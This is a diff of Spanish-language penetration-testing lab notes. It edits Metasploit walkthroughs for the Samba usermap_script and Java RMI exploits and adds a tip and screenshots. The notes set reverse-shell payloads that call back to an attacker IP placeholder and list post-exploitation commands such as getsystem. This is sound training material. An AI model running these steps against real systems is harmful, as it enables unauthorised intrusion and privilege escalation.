@@ -47,7 +47,7 @@ set LPORT 4444
 # 6. Ejecutar exploit
 exploit
 
-# 7. Post-explotación (una vez obtenida la shell)
+# 7. Post-explotación
 whoami
 hostname
 uname -a
@@ -57,7 +57,9 @@ ifconfig
 ![](attachments/{911F40C7-C6B8-4E5E-A5F7-35055A1FD85A}%201.png)
 ![](attachments/{4C5D7EA3-8D70-45DD-81D3-A2BEE15DD36D}.png)
 ![](attachments/{F42FF184-6EE8-4B37-AF80-FD01F808E9E3}.png)
-
+> [!TIP]
+> Usamos setg para no tener que escribir el RHOSTS y el LHOST en cada uso de exploit.
+![](attachments/{6A8E97A6-2AE6-4D51-92BB-4FC50EB0C81E}%201.png)
 ## Ejercicio 2 — Samba Usermap Script
 
 ### Ficha de la vulnerabilidad
@@ -89,14 +91,13 @@ use exploit/multi/samba/usermap_script
 set RHOSTS <IP_VICTIMA>
 set RPORT 139
 
-# 5. Elegir payload (cmd/unix/reverse_netcat — netcat suele estar instalado
-#    en sistemas Unix y no requiere procesos hijos adicionales)
+# 5. Elegir payload
 show payloads
 set payload cmd/unix/reverse_netcat
 set LHOST <IP_ATACANTE>
 set LPORT 4444
 
-# 6. Configurar listener (si es necesario) y explotar
+# 6. Ejecutar exploit
 exploit
 
 # 7. Post-explotación
@@ -108,6 +109,7 @@ id
 
 ![](attachments/Pasted%20image%2020260714180912.png)
 ![](attachments/{FCCD99D4-64C3-4499-BFF3-6B0115534273}.png)
+![](attachments/Pasted%20image%2020260714182005.png)
 
 ## Ejercicio 3 — Java RMI
 
@@ -140,8 +142,7 @@ use exploit/multi/misc/java_rmi_server
 set RHOSTS <IP_VICTIMA>
 set RPORT 1099
 
-# 5. Elegir payload (java/meterpreter/reverse_tcp — permite interactuar con
-#    la máquina víctima mediante Meterpreter, ofreciendo módulos post-explotación)
+# 5. Elegir payload
 set payload java/meterpreter/reverse_tcp
 set LHOST <IP_ATACANTE>
 set LPORT 4444
@@ -149,14 +150,13 @@ set LPORT 4444
 # 6. Ejecutar exploit
 exploit
 
-# 7. Post-explotación (dentro de Meterpreter)
+# 7. Post-explotación 
 getuid
 sysinfo
 ifconfig
 getsystem
 ```
-
----
+![](attachments/Pasted%20image%2020260714182144.png)
 
 ## AVANZADO
 
